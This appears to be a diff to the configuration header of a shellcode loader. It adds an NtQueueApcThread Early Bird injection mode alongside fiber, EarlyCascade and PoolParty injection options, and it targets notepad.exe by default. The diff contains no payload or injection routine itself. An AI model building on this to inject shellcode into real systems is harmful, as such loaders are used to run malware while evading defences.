@@ -71,11 +71,12 @@
 // 2 = CreateFiber         - Fiber-based execution (Self) - requires shellcode ABI compliance
 // 3 = EarlyCascade        - Early Bird APC injection via NtQueueApcThread (Remote)
 // 4 = PoolParty           - Worker Factory thread pool injection (Remote)
+// 5 = NtQueueApcThread    - Vanilla NtQueueApcThread Early Bird with jittered post-APC delay (Remote)
 #ifndef CONFIG_INJECTION_TYPE
 #define CONFIG_INJECTION_TYPE 4
 #endif
 
-#if CONFIG_INJECTION_TYPE == 1 || CONFIG_INJECTION_TYPE == 3
+#if CONFIG_INJECTION_TYPE == 1 || CONFIG_INJECTION_TYPE == 3 || CONFIG_INJECTION_TYPE == 5
 #ifndef CONFIG_TARGET_PROCESS
 #define CONFIG_TARGET_PROCESS L"C:\\Windows\\System32\\notepad.exe"
 #endif
@@ -114,6 +115,8 @@
 #define ExecuteShellcode erebus::InjectionEarlyCascade
 #elif CONFIG_INJECTION_TYPE == 4
 #define ExecuteShellcode erebus::InjectionPoolParty
+#elif CONFIG_INJECTION_TYPE == 5
+#define ExecuteShellcode erebus::InjectionNtQueueApcThread
 #endif
 
 // ============================================
